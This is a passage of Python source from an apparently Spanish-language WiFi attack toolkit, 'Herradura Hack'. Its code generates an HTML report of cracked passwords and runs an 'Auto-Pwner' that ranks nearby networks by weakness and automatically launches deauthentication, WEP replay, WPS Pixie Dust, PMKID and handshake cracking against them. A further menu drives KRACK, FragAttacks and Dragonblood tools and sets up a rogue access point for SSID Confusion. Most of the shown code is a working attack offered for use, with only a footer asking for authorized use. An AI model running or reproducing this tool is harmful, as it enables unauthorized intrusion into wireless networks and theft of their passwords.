            out += f"<tr><td>{esc(p[1])}</td><td>{esc(p[2])}</td><td>{esc(p[3])}</td><td>{esc(p[4])}</td></tr>"
        return out

    report_html = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Herradura Hack — Reporte de Pentesting WiFi</title>
<style>
  :root{{--green:#27ae60;--red:#e74c3c;--blue:#2980b9;--dark:#1a1a2e;--card:#fff}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;color:#333}}
  .header{{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;padding:40px;text-align:center}}
  .header h1{{font-size:2.2em;margin-bottom:8px}}
  .header .sub{{color:#aaa;font-size:1em}}
  .stats{{display:flex;gap:20px;padding:30px;flex-wrap:wrap;justify-content:center}}
  .stat-card{{background:#fff;border-radius:12px;padding:24px 32px;text-align:center;
              box-shadow:0 2px 12px rgba(0,0,0,.08);min-width:160px}}
  .stat-card .num{{font-size:2.5em;font-weight:bold}}
  .stat-card .lbl{{color:#888;font-size:14px;margin-top:6px}}
  .green{{color:var(--green)}}.red{{color:var(--red)}}.blue{{color:var(--blue)}}
  .section{{margin:0 30px 30px;background:#fff;border-radius:12px;
            box-shadow:0 2px 12px rgba(0,0,0,.06);overflow:hidden}}
  .section-header{{background:linear-gradient(135deg,#2c3e50,#34495e);
                   color:#fff;padding:18px 24px;font-size:1.1em;font-weight:bold}}
  table{{width:100%;border-collapse:collapse;font-size:14px}}
  th{{background:#f8f9fa;padding:12px 16px;text-align:left;
      border-bottom:2px solid #e0e0e0;color:#555;font-weight:600}}
  td{{padding:11px 16px;border-bottom:1px solid #f0f0f0}}
  tr:hover td{{background:#f8f9fa}}
  .badge{{padding:3px 10px;border-radius:20px;font-size:12px;font-weight:bold}}
  .badge-ok{{background:#d4efdf;color:#1e8449}}
  .badge-warn{{background:#fdebd0;color:#e67e22}}
  .footer{{text-align:center;padding:30px;color:#aaa;font-size:13px}}
</style>
</head>
<body>
<div class="header">
  <h1>🛡 Herradura Hack</h1>
  <div class="sub">Reporte de Pentesting WiFi — Generado: {html_module.escape(SESSION_START)} — Creador: Apo1o13</div>
</div>

<div class="stats">
  <div class="stat-card"><div class="num green">{total_attacks}</div><div class="lbl">Ataques ejecutados</div></div>
  <div class="stat-card"><div class="num red">{total_pwds}</div><div class="lbl">Contraseñas crackeadas</div></div>
  <div class="stat-card"><div class="num blue">{total_hs}</div><div class="lbl">Handshakes capturados</div></div>
  <div class="stat-card"><div class="num green">{total_devices}</div><div class="lbl">Dispositivos analizados</div></div>
  <div class="stat-card"><div class="num">{len(probes)}</div><div class="lbl">Probes capturados</div></div>
</div>

<div class="section">
  <div class="section-header">📋 Registro de Ataques</div>
  <table><thead><tr><th>Fecha</th><th>Tipo</th><th>ESSID</th><th>BSSID</th><th>Canal</th><th>Resultado</th></tr></thead>
  <tbody>{rows_attacks()}</tbody></table>
</div>

<div class="section">
  <div class="section-header">🔑 Contraseñas Obtenidas</div>
  <table><thead><tr><th>Fecha</th><th>ESSID</th><th>BSSID</th><th>Contraseña</th><th>Método</th></tr></thead>
  <tbody>{rows_passwords()}</tbody></table>
</div>

<div class="section">
  <div class="section-header">📱 Dispositivos en Red</div>
  <table><thead><tr><th>Fecha</th><th>IP</th><th>MAC</th><th>Fabricante</th><th>Hostname</th><th>Puertos</th><th>Vulnerabilidades</th></tr></thead>
  <tbody>{rows_devices()}</tbody></table>
</div>

<div class="section">
  <div class="section-header">📡 Probe Requests Capturados</div>
  <table><thead><tr><th>Fecha</th><th>MAC</th><th>SSID buscado</th><th>Fabricante</th></tr></thead>
  <tbody>{rows_probes()}</tbody></table>
</div>

<div class="footer">
  Herradura Hack v5.0 — Creador: Apo1o13 — Uso exclusivo para pentesting autorizado
</div>
</body>
</html>"""

    os.makedirs("reports", exist_ok=True)
    ts_file = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = f"reports/herradura_{ts_file}.html"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(report_html)

    ok(f"Reporte generado: {CYAN}{out_file}{END}")
    info("Ábralo en su navegador: firefox reports/herradura_*.html")
    run(f"xdg-open {out_file} 2>/dev/null &")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 31 — ATAQUE AUTOMÁTICO INTELIGENTE (AUTO-PWNER)
#  Escanea, evalúa vulnerabilidades y lanza el mejor ataque automáticamente
# ═════════════════════════════════════════════════════════════════════════════

# Puntuación de vulnerabilidad por criterio
_VULN_SCORES = {
    "WEP":        100,   # trivialmente roto
    "OPN":        100,   # sin cifrado
    "WPS_YES":     80,   # WPS activo → Pixie Dust
    "WPA_ONLY":    60,   # WPA1, sin WPA2
    "WPA2_PMKID":  50,   # PMKID siempre disponible en WPA2
    "WPA2_HS":     40,   # handshake requiere cliente
    "WPA3":         5,   # difícil, Dragonblood parcialmente
}

def _score_network(red, wps_list=None):
    """Calcula puntuación de vulnerabilidad y mejor vector de ataque."""
    priv  = red.get("privacy","").upper()
    bssid = red.get("bssid","").upper()
    essid = red.get("essid","").upper()
    score = 0
    vector = []

    if "WEP" in priv:
        score = _VULN_SCORES["WEP"]
        vector = ["WEP"]
    elif "OPN" in priv or not priv:
        score = _VULN_SCORES["OPN"]
        vector = ["OPEN"]
    else:
        has_wps = wps_list and any(bssid.lower() in w.lower() for w in wps_list)

        # Detección de marca: TP-Link casi siempre tiene WPS activo por defecto
        _TPLINK_OUIS = {"E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
                        "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7",
                        "74:DA:38","F4:F2:6D","DC:FE:18","30:DE:4B",
                        "00:1D:0F","14:CC:20","1C:61:B4"}
        oui = ":".join(bssid.split(":")[:3])
        is_tplink   = ("TP-LINK" in essid or "TPLINK" in essid or oui in _TPLINK_OUIS)
        is_antel    = ("ANTEL" in essid)
        is_frog     = ("FROG" in essid or "WIFIFROG" in essid)
        is_claro    = ("CLARO" in essid)
        is_movistar = ("MOVISTAR" in essid or "MOVISTAR" in essid)

        if is_tplink:
            has_wps = True   # TP-Link tiene WPS por defecto en la mayoría de modelos
        if has_wps:
            score = max(score, _VULN_SCORES["WPS_YES"])
            vector.append("PIXIE_DUST")

        if "WPA2" in priv or "WPA3" in priv:
            score = max(score, _VULN_SCORES["WPA2_PMKID"])
            vector.append("PMKID")
            vector.append("HANDSHAKE")
        elif "WPA" in priv:
            score = max(score, _VULN_SCORES["WPA_ONLY"])
            vector.append("HANDSHAKE")

        # Bonus por ISP/marca conocida con contraseñas predecibles
        if is_antel or is_frog or is_claro or is_movistar:
            score = min(score + 15, 95)
            if "DEFAULT_PASS" not in vector:
                vector.insert(0, "DEFAULT_PASS")

        if "WPA3" in priv and "WPA2" not in priv:
            score = max(score, _VULN_SCORES["WPA3"])
            vector = ["DRAGONBLOOD_DOWNGRADE"]

    return score, vector

def auto_pwner():
    """[31] Auto-Pwner: evalúa vulnerabilidades y ataca automáticamente."""
    os.system("clear")
    banner()
    separador("AUTO-PWNER — ATAQUE INTELIGENTE AUTOMATIZADO")
    print(f"""
  {WHITE}¿Cómo funciona?{END}
  {DIM}1. Escanea todas las redes cercanas
  2. Evalúa cada una con puntuación de vulnerabilidad
  3. Ordena de más a menos vulnerable
  4. Lanza el ataque más efectivo para cada red
  5. Guarda todo en historial y genera reporte{END}
    """)

    interfaz = select_interface()
    wordlist  = select_wordlist() or "/usr/share/wordlists/rockyou.txt"

    t = ask("Tiempo de escaneo inicial (recomendado: 25 segundos)")
    try:
        t = max(10, min(int(t), 60))
    except ValueError:
        t = 25

    # ── Escaneo + WPS ─────────────────────────────────────────────────────────
    step(1, "Escaneando redes y verificando WPS...")
    redes = quick_scan(interfaz, t)
    if not redes:
        error("No se detectaron redes. ¿Está en modo monitor?")
        pause_back(); return

    wps_raw = ""
    if check_tool("wash"):
        sp = Spinner("Verificando WPS en paralelo...")
        sp.start()
        try:
            wps_raw = subprocess.run(
                f"timeout 12 wash -i {interfaz} 2>/dev/null",
                shell=True, capture_output=True, text=True
            ).stdout
        except Exception:
            pass
        sp.stop()

    # ── Puntuar y ordenar ─────────────────────────────────────────────────────
    step(2, "Evaluando vulnerabilidades...")
    scored = []
    for r in redes:
        s, v = _score_network(r, [wps_raw])
        scored.append((s, v, r))
    scored.sort(key=lambda x: x[0], reverse=True)

    separador("REDES RANKEADAS POR VULNERABILIDAD")
    print(f"  {WHITE}{'#':<4} {'ESSID':<26} {'SEGURIDAD':<12} {'VECTOR':<25} {'SCORE'}{END}")
    separador()
    for i, (score, vectors, r) in enumerate(scored, 1):
        if score >= 80:   sc = f"{RED}{score:>3}{END}"
        elif score >= 50: sc = f"{YELLOW}{score:>3}{END}"
        else:             sc = f"{GREEN}{score:>3}{END}"
        priv_short = r['privacy'][:10]
        vec_str = ",".join(vectors[:2])
        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{r['essid'][:24]:<26}{END} "
              f"{YELLOW}{priv_short:<12}{END} {GREEN}{vec_str:<25}{END} {sc}")
    separador()

    sel = ask("¿Atacar cuáles? (ej: 1,2,3 / 'top3' / 'all' / número)")
    targets_to_attack = []
    if sel.lower() == "all":
        targets_to_attack = scored
    elif sel.lower() == "top3":
        targets_to_attack = scored[:3]
    elif sel.lower() == "top5":
        targets_to_attack = scored[:5]
    else:
        for part in sel.split(","):
            part = part.strip()
            if part.isdigit() and 1 <= int(part) <= len(scored):
                targets_to_attack.append(scored[int(part)-1])

    if not targets_to_attack:
        error("Sin objetivos seleccionados.")
        pause_back(); return

    # ── Atacar en secuencia ───────────────────────────────────────────────────
    step(3, f"Iniciando ataques en {len(targets_to_attack)} objetivo(s)...")
    resultados = []

    for score, vectors, red in targets_to_attack:
        bssid   = red["bssid"]
        channel = red["channel"]
        essid   = red["essid"]
        priv    = red["privacy"].upper()
        essid_s = re.sub(r'[^\w\-]', '_', essid)

        separador(f"ATACANDO: {essid}")
        info(f"BSSID: {bssid}  Canal: {channel}  Vector: {','.join(vectors)}")

        resultado = "sin_resultado"
        clave = None

        # ── OPEN: conectar directo ────────────────────────────────────────────
        if "OPEN" in vectors:
            ok(f"RED ABIERTA: {essid} — Sin contraseña necesaria")
            resultado = "ABIERTA"
            aid = db_log_attack("Auto-Pwner OPEN", essid, bssid, channel, resultado)
            resultados.append((essid, "ABIERTA", "N/A"))
            continue

        # ── WEP ───────────────────────────────────────────────────────────────
        if "WEP" in vectors:
            info("Vector: WEP → ARP replay automático")
            os.makedirs("handshakes", exist_ok=True)
            out_base = f"handshakes/auto_wep_{essid_s}"
            run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {interfaz} 2>/dev/null")
            cap_p = subprocess.Popen(
                f"airodump-ng -c {channel} --bssid {bssid} -w {out_base} {interfaz}",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            try:
                subprocess.run(f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
                               shell=True, timeout=60)
            except (subprocess.TimeoutExpired, KeyboardInterrupt):
                pass
            cap_p.terminate(); time.sleep(2)
            cap_file = out_base + "-01.cap"
            res = run(f"aircrack-ng {cap_file} 2>/dev/null", capture=True) or ""
            _wep_key = None
            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
                _wm = re.search(_pat, res, re.IGNORECASE)
                if _wm:
                    _wep_key = _wm.group(1).strip()
                    break
            clave = _wep_key or "encontrada (ver salida)"
            if _wep_key:
                ok(f"WEP CRACKEADA: {GREEN}{clave}{END}")
                resultado = f"crackeada:{clave}"
                aid = db_log_attack("Auto-Pwner WEP", essid, bssid, channel, resultado, cap_file)
                db_log_password(aid, essid, bssid, clave, "aircrack WEP")
            else:
                resultado = "WEP_IVs_insuficientes"
                aid = db_log_attack("Auto-Pwner WEP", essid, bssid, channel, resultado, cap_file)
            resultados.append((essid, "WEP", clave or "insuficientes IVs"))
            continue

        # ── PIXIE DUST WPS ────────────────────────────────────────────────────
        if "PIXIE_DUST" in vectors and check_tool("reaver"):
            info("Vector: WPS Pixie Dust → intentando...")
            tip("Si el router es vulnerable se obtiene en segundos.")
            pixie_out = run(
                f"timeout 45 reaver -i {interfaz} -b {bssid} -c {channel} -K 1 -vv 2>&1",
                capture=True
            ) or ""
            pin_m = re.search(r'WPS PIN.*?[:\s]+(\d{8})', pixie_out, re.IGNORECASE)
            psk_m = re.search(r'WPA PSK.*?[:\s]+["\']?([^\s"\']+)', pixie_out, re.IGNORECASE)
            if psk_m:
                clave = psk_m.group(1)
                ok(f"WPS PIXIE DUST: {GREEN}{clave}{END}")
                resultado = f"crackeada:{clave}"
                aid = db_log_attack("Auto-Pwner Pixie", essid, bssid, channel, resultado)
                db_log_password(aid, essid, bssid, clave, "Pixie Dust WPS")
                resultados.append((essid, "Pixie Dust", clave))
                continue
            else:
                warn("Pixie Dust no exitoso. Probando PMKID...")

        # ── PMKID ─────────────────────────────────────────────────────────────
        if "PMKID" in vectors and check_tool("hcxdumptool"):
            info("Vector: PMKID → capturando hash sin clientes...")
            os.makedirs("scan-output", exist_ok=True)
            pmkid_file = f"scan-output/auto_pmkid_{essid_s}.pcapng"
            hc_file    = f"scan-output/auto_pmkid_{essid_s}.hc22000"
            run(f"rm -f {pmkid_file} {hc_file} 2>/dev/null")
            progress_bar(30, f"PMKID de {essid}")
            run(f"timeout 30 hcxdumptool -i {interfaz} -o {pmkid_file} "
                f"--filterlist_ap={bssid} --filtermode=2 --active_beacon "
                f"--enable_status=3 2>/dev/null")
            if os.path.exists(pmkid_file) and check_tool("hcxpcapngtool"):
                run(f"hcxpcapngtool -o {hc_file} {pmkid_file} 2>/dev/null")
            if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0 and check_tool("hashcat"):
                info("PMKID capturado. Crackeando con hashcat...")
                best64 = next((p for p in [
                    "/usr/share/hashcat/rules/best64.rule",
                    "/usr/share/doc/hashcat/rules/best64.rule",
                ] if os.path.exists(p)), "")
                rf = f"-r {best64}" if best64 else ""
                hc_out = run(
                    f"hashcat -m 22000 {hc_file} {wordlist} {rf} --force "
                    f"--status --status-timer=5 --machine-readable 2>/dev/null",
                    capture=True
                ) or ""
                pwd_m = re.search(r'Recovered.*?:.*?:([^:]+)$', hc_out, re.MULTILINE)
                if not pwd_m:
                    pwd_m = re.search(r'\*\*\*\s*(.+)', hc_out)
                # hashcat potfile
                potfile = run("hashcat --potfile-path ~/.hashcat/hashcat.potfile "
                              f"--show -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
                pot_m = re.search(r':(.+)$', potfile, re.MULTILINE)
                if pot_m:
                    clave = pot_m.group(1).strip()
                    ok(f"PMKID CRACKEADO: {GREEN}{clave}{END}")
                    resultado = f"crackeada:{clave}"
                    aid = db_log_attack("Auto-Pwner PMKID", essid, bssid, channel, resultado, hc_file)
                    db_log_password(aid, essid, bssid, clave, "hashcat PMKID")
                    resultados.append((essid, "PMKID", clave))
                    continue
                else:
                    warn("PMKID no crackeado con el diccionario actual.")
            else:
                warn("No se obtuvo hash PMKID.")

        # ── HANDSHAKE + CRACK ─────────────────────────────────────────────────
        if "HANDSHAKE" in vectors:
            info("Vector: Handshake WPA2 → capturando...")
            os.makedirs("handshakes", exist_ok=True)
            ruta = f"handshakes/auto_{essid_s}"
            cap_p = subprocess.Popen(
                f"xterm -title 'Auto-Capture {essid}' -e "
                f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}'",
                shell=True)
            time.sleep(6)
            run(f"aireplay-ng -0 20 -a {bssid} {interfaz} 2>/dev/null")
            time.sleep(5)
            cap_p.terminate()

            ok_hs, cap_file = verify_handshake(ruta)
            if ok_hs:
                ok(f"Handshake capturado: {cap_file}")
                hc_f = ruta + ".hc22000"
                if check_tool("hcxpcapngtool"):
                    run(f"hcxpcapngtool -o {hc_f} {cap_file} 2>/dev/null")
                if check_tool("hashcat") and os.path.exists(hc_f) and os.path.getsize(hc_f) > 0:
                    best64 = next((p for p in [
                        "/usr/share/hashcat/rules/best64.rule",
                        "/usr/share/doc/hashcat/rules/best64.rule",
                    ] if os.path.exists(p)), "")
                    rf = f"-r {best64}" if best64 else ""
                    run(f"hashcat -m 22000 {hc_f} {wordlist} {rf} --force "
                        f"--status --status-timer=10 2>/dev/null")
                    potfile = run(f"hashcat --show -m 22000 {hc_f} 2>/dev/null", capture=True) or ""
                    pm = re.search(r':(.+)$', potfile, re.MULTILINE)
                    if pm:
                        clave = pm.group(1).strip()
                        ok(f"CONTRASEÑA: {GREEN}{clave}{END}")
                        resultado = f"crackeada:{clave}"
                        aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
                        db_log_password(aid, essid, bssid, clave, "hashcat WPA2")
                        db_log_handshake(aid, cap_file, hc_f)
                    else:
                        info("Crackeando con aircrack-ng...")
                        run(f"aircrack-ng {cap_file} -w {wordlist}")
                        resultado = "handshake_capturado"
                        aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
                        db_log_handshake(aid, cap_file)
                else:
                    run(f"aircrack-ng {cap_file} -w {wordlist}")
                    resultado = "handshake_capturado"
                    aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado, cap_file)
            else:
                resultado = "handshake_fallido"
                aid = db_log_attack("Auto-Pwner HS", essid, bssid, channel, resultado)
                warn(f"No se capturó handshake de {essid}.")
            resultados.append((essid, "WPA2 Handshake", clave or resultado))

    # ── Resumen final ─────────────────────────────────────────────────────────
    separador("RESUMEN AUTO-PWNER")
    print(f"  {WHITE}{'ESSID':<28} {'MÉTODO':<20} {'RESULTADO'}{END}")
    separador()
    for essid_r, metodo, res in resultados:
        if "crackeada" in str(res).lower() or (res and res != "insuficientes IVs" and res != "handshake_fallido"):
            rc = f"{GREEN}{res[:30]}{END}"
        else:
            rc = f"{YELLOW}{res[:30]}{END}"
        print(f"  {CYAN}{essid_r[:26]:<28}{END} {WHITE}{metodo:<20}{END} {rc}")

    print()
    gen = ask("¿Generar reporte HTML ahora? (s/n)")
    if gen.lower() == "s":
        generate_report()
    else:
        pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 32 — VULNERABILIDADES WiFi MODERNAS (2023-2025)
# ═════════════════════════════════════════════════════════════════════════════

def modern_vulns():
    """[32] Vulnerabilidades WiFi modernas (Dragonblood, KRACK, FragAttacks, etc.)."""
    os.system("clear")
    banner()
    separador("VULNERABILIDADES WiFi MODERNAS 2023-2025")
    print(f"""
  {WHITE}Seleccione la vulnerabilidad a explotar:{END}

  {RED}[1]{END} {WHITE}Dragonblood (WPA3-SAE){END}         {DIM}CVE-2019-9494/9496{END}
      {DIM}Side-channel + downgrade WPA3 → WPA2{END}

  {RED}[2]{END} {WHITE}PMKID Attack (WPA2/WPA3){END}       {DIM}Técnica Jens Steube 2018{END}
      {DIM}Captura hash sin clientes, crackeo offline{END}

  {RED}[3]{END} {WHITE}FragAttacks{END}                     {DIM}CVE-2020-24588/24587/26140{END}
      {DIM}Inyección de frames en redes WPA/WPA2/WPA3{END}

  {RED}[4]{END} {WHITE}KRACK (Key Reinstallation){END}      {DIM}CVE-2017-13077 a 13088{END}
      {DIM}Reinstalación de clave, descifra tráfico WPA2{END}

  {RED}[5]{END} {WHITE}Evil Twin + SSID Confusion{END}      {DIM}CVE-2023-52424 (2024){END}
      {DIM}Confusión de SSID en redes 802.11 multi-BSSID{END}

  {RED}[6]{END} {WHITE}WPS Pixie Dust Mejorado{END}         {DIM}Múltiples CVEs{END}
      {DIM}Ataque offline al nonce del AP, funciona en minutos{END}

  {RED}[7]{END} {WHITE}PMKID + Wordlist OSINT{END}          {DIM}Combinado{END}
      {DIM}PMKID automático + wordlist generada por SSID{END}

  {RED}[8]{END} {WHITE}Beacon Frame Injection{END}          {DIM}802.11 Management frames{END}
      {DIM}Inyección de beacons malformados para DoS selectivo{END}

  {WHITE}[0]{END} Volver al menú
    """)

    op = ask("Seleccione exploit")

    # ── [1] Dragonblood ───────────────────────────────────────────────────────
    if op == "1":
        separador("DRAGONBLOOD — WPA3 SAE ATTACK")
        print(f"""
  {WHITE}Dragonblood{END} es un conjunto de vulnerabilidades en WPA3-SAE:
  {DIM}• Side-channel timing/cache — permite recuperar contraseña
  • Downgrade attack — fuerza al cliente a usar WPA2
  • Denial of Service — colapsa el handshake SAE{END}
        """)
        if not check_tool("dragonslayer") and not check_tool("dragonforce"):
            warn("dragonslayer/dragonforce no encontrados.")
            info("Instale desde: https://github.com/vanhoefm/dragonslayer")
            info("Alternativamente, Dragonblood usa hostapd modificado.")
            tip("En Kali: git clone https://github.com/vanhoefm/dragonslayer")
            separador("DOWNGRADE MANUAL WPA3 → WPA2")
            tip("Si el AP soporta WPA2/WPA3 mixto, un Evil Twin WPA2 fuerza downgrade.")
            hacer = ask("¿Lanzar Evil Twin WPA2 para forzar downgrade? (s/n)")
            if hacer.lower() == "s":
                evil_twin()
            else:
                pause_back()
            return

        interfaz = select_interface()
        bssid, channel, essid = select_target_from_scan(interfaz)
        if not bssid:
            pause_back(); return

        info(f"Ejecutando Dragonslayer contra {essid} ({bssid})")
        tip("El ataque puede tardar varios minutos según el AP.")

        if check_tool("dragonslayer"):
            run(f"dragonslayer -i {interfaz} -b {bssid} -e {essid} -c {channel}")
        else:
            run(f"dragonforce -i {interfaz} -b {bssid} -e {essid}")

        db_log_attack("Dragonblood WPA3", essid, bssid, channel, "ejecutado")

    # ── [2] PMKID avanzado ────────────────────────────────────────────────────
    elif op == "2":
        separador("PMKID ATTACK — MODO AVANZADO")
        print(f"""
  {DIM}El PMKID está en el primer frame del 4-way handshake.
  No requiere ningún cliente conectado.
  Calculado como: HMAC-SHA1(PMK, "PMK Name" + BSSID + MAC_cliente)
  Con el hash se puede atacar offline con cualquier wordlist.{END}
        """)
        pmkid_attack()

    # ── [3] FragAttacks ───────────────────────────────────────────────────────
    elif op == "3":
        separador("FRAGATTACKS — INYECCIÓN DE FRAMES")
        print(f"""
  {WHITE}FragAttacks{END} (Fragmentation & Aggregation Attacks):
  {DIM}• CVE-2020-24588: A-MSDU flag aggregation attack
  • CVE-2020-24587: Mixed key attack (fragmentos mezclados)
  • CVE-2020-26140: Plaintext injection en redes protegidas
  • Afecta WEP, WPA, WPA2 y WPA3{END}
        """)
        if not check_tool("fragattacks"):
            warn("fragattacks no instalado.")
            info("Instale: pip3 install fragattacks")
            info("O:       git clone https://github.com/vanhoefm/fragattacks")
            tip("Requiere driver parcheado (mac80211_hwsim o Alfa compatible)")
        else:
            interfaz = select_interface()
            bssid, channel, essid = select_target_from_scan(interfaz)
            if bssid:
                info("Ejecutando FragAttacks test suite...")
                run(f"fragattacks {interfaz} --bssid {bssid} ping --inject-test 2>/dev/null")
                run(f"fragattacks {interfaz} --bssid {bssid} ping --inject-test-postauth 2>/dev/null")
                db_log_attack("FragAttacks", essid, bssid, channel, "ejecutado")

    # ── [4] KRACK ─────────────────────────────────────────────────────────────
    elif op == "4":
        separador("KRACK — KEY REINSTALLATION ATTACK")
        print(f"""
  {WHITE}KRACK{END} explota la reinstalación de claves en el 4-way handshake:
  {DIM}• Fuerza reutilización de nonce en la clave de sesión
  • Permite descifrar/inyectar tráfico WPA2
  • Más efectivo contra clientes Android/Linux sin parche
  • CVE-2017-13077 a CVE-2017-13088
  • Requiere madwifi/mac80211 parcheado y adaptador con inyección{END}
        """)
        # Buscar herramienta KRACK en PATH y en /opt
        _krack_script = None
        for _kpath in ["/opt/krackattacks-poc-zerokey/krack-test-client.py",
                       "/opt/krackattacks-scripts/krack-test-client.py",
                       "/opt/krackattacks/krack-test-client.py"]:
            if os.path.exists(_kpath):
                _krack_script = _kpath
                break
        if not _krack_script:
            _kr_which = run("which krack-test-client.py 2>/dev/null", capture=True) or ""
            if _kr_which.strip():
                _krack_script = _kr_which.strip()
        if not _krack_script and check_tool("krackattacks"):
            _krack_script = "krackattacks"

        if not _krack_script:
            warn("krackattacks-poc-zerokey no encontrado en PATH ni en /opt.")
            info("Instale con:")
            tip("  git clone https://github.com/vanhoefm/krackattacks-poc-zerokey /opt/krackattacks-poc-zerokey")
            tip("  cd /opt/krackattacks-poc-zerokey && pip3 install -r requirements.txt")
            tip("Requiere: hostapd parcheado + adaptador con inyección (mac80211)")
            tip("Distros modernas (2018+) están parcheadas. Más efectivo en IoT/AP sin actualizar.")
        else:
            interfaz = select_interface()
            bssid, channel, essid = select_target_from_scan(interfaz)
            if bssid:
                info(f"Ejecutando KRACK contra {essid} ({bssid})...")
                tip("El ataque prueba reinstalación de claves en el 4-way handshake.")
                if _krack_script.endswith(".py"):
                    run(f"python3 {_krack_script} --interface {interfaz} --bssid {bssid}")
                else:
                    run(f"{_krack_script} --interface {interfaz} --bssid {bssid}")
                db_log_attack("KRACK CVE-2017-13077", essid, bssid, channel, "ejecutado")

    # ── [5] SSID Confusion (CVE-2023-52424) ──────────────────────────────────
    elif op == "5":
        separador("SSID CONFUSION ATTACK (CVE-2023-52424)")
        print(f"""
  {WHITE}SSID Confusion{END} — Publicado Mayo 2024:
  {DIM}• El estándar 802.11 no autentica el SSID en el beacon
  • En redes multi-BSSID (roaming), se puede engañar al cliente
  • El cliente cree conectarse a la red "Trabajo-Seguro"
    pero en realidad se conecta a "Trabajo-Inseguro"
  • Afecta prácticamente TODOS los clientes WiFi modernos
  • No requiere conocer la contraseña de la red objetivo{END}
        """)
        interfaz  = select_interface()
        bssid, channel, essid = select_target_from_scan(interfaz)
        if not bssid:
            pause_back(); return

        essid_malo = ask(f"SSID de la red 'insegura' a clonar (la víctima tiene guardada esta) [{essid}]")
        if not essid_malo:
            essid_malo = essid

        info(f"Configurando SSID Confusion: víctima cree conectarse a '{essid}' pero llega a '{essid_malo}'")
        tip("Esto explota que el beacon no autentica el SSID — el cliente confía en el BSSID.")

        os.makedirs("/tmp/herradura_ssid_conf", exist_ok=True)
        with open("/tmp/herradura_ssid_conf/hostapd.conf", "w") as f:
            f.write(f"""interface={interfaz}
driver=nl80211
ssid={essid_malo}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
bssid={bssid}
""")
        info("Levantando AP con SSID confuso...")
        tip("Los clientes que tengan guardada esa red se conectarán automáticamente.")
        try:
            subprocess.run(["hostapd", "/tmp/herradura_ssid_conf/hostapd.conf"],
                           timeout=120)
        except (KeyboardInterrupt, subprocess.TimeoutExpired):
            pass
        run("pkill hostapd 2>/dev/null")
        db_log_attack("SSID Confusion CVE-2023-52424", essid, bssid, channel, "ejecutado")

    # ── [6] WPS Pixie Dust mejorado ───────────────────────────────────────────
    elif op == "6":
        separador("WPS PIXIE DUST MEJORADO")
        print(f"""
  {DIM}Pixie Dust explota el uso de nonces débiles (E-S1, E-S2) en el
  intercambio WPS. El AP genera números aleatorios predecibles.
  Funciona offline: con 1 intercambio se obtiene el PIN y la PSK.
  Routers vulnerables: TP-Link, D-Link, Huawei, Netgear (versiones viejas).{END}
        """)
        interfaz = select_interface()

        # Escanear WPS automáticamente
        sp = Spinner("Buscando APs con WPS activo...")
        sp.start()
        wps_out = run(f"timeout 15 wash -i {interfaz} 2>/dev/null", capture=True) or "" if check_tool("wash") else ""
        sp.stop()

        wps_targets = []
        for line in wps_out.splitlines():
            parts = line.split()
            if len(parts) >= 5 and re.match(r'[0-9a-fA-F:]{17}', parts[0]):
                bssid_w  = parts[0]
                ch_w     = parts[1]
                locked_w = parts[3] if len(parts) > 3 else "?"
                essid_w  = " ".join(parts[5:]) if len(parts) > 5 else "?"
                wps_targets.append({"bssid": bssid_w, "channel": ch_w, "locked": locked_w, "essid": essid_w})

        if wps_targets:
            separador("APs CON WPS DETECTADOS")
            for i, t in enumerate(wps_targets, 1):
                lock_col = RED if t["locked"].lower() == "yes" else GREEN
                print(f"  {WHITE}[{i}]{END} {CYAN}{t['essid']:<24}{END} {DIM}{t['bssid']}{END} "
                      f"CH:{t['channel']} WPS-Locked:{lock_col}{t['locked']}{END}")
            sel_w = ask("Seleccione objetivo (priorice WPS-Locked: No)")
            if sel_w.isdigit() and 1 <= int(sel_w) <= len(wps_targets):
                tw = wps_targets[int(sel_w)-1]
                bssid, channel, essid = tw["bssid"], tw["channel"], tw["essid"]
            else:
                bssid, channel, essid = select_target_from_scan(interfaz)
        else:
            bssid, channel, essid = select_target_from_scan(interfaz)

        if not bssid:
            pause_back(); return

        info("Lanzando Pixie Dust con múltiples herramientas...")
        clave = None

        # Reaver Pixie
        if check_tool("reaver"):
            info("Intentando con Reaver -K 1...")
            out = run(f"timeout 60 reaver -i {interfaz} -b {bssid} -c {channel} "
                      f"-K 1 -N -vv 2>&1", capture=True) or ""
            pm = re.search(r'WPA PSK.*?[:\s]+["\']?([^\s"\']+)', out, re.IGNORECASE)
            if pm:
                clave = pm.group(1)

        # Bully Pixie como fallback
        if not clave and check_tool("bully"):
            info("Fallback: Bully Pixie Dust...")
            out = run(f"timeout 60 bully {interfaz} -b {bssid} -c {channel} "
                      f"-e {essid} -d --force 2>&1", capture=True) or ""
            pm = re.search(r'PSK\s*=\s*["\']?([^\s"\']+)', out, re.IGNORECASE)
            if pm:
                clave = pm.group(1)

        if clave:
            ok(f"CLAVE OBTENIDA: {GREEN}{clave}{END}")
            aid = db_log_attack("Pixie Dust Avanzado", essid, bssid, channel, f"crackeada:{clave}")
            db_log_password(aid, essid, bssid, clave, "WPS Pixie Dust")
        else:
            warn("Pixie Dust no exitoso. El AP puede no ser vulnerable.")
            tip("Intente PIN brute force con la opción [10] → modo 3 o 4.")

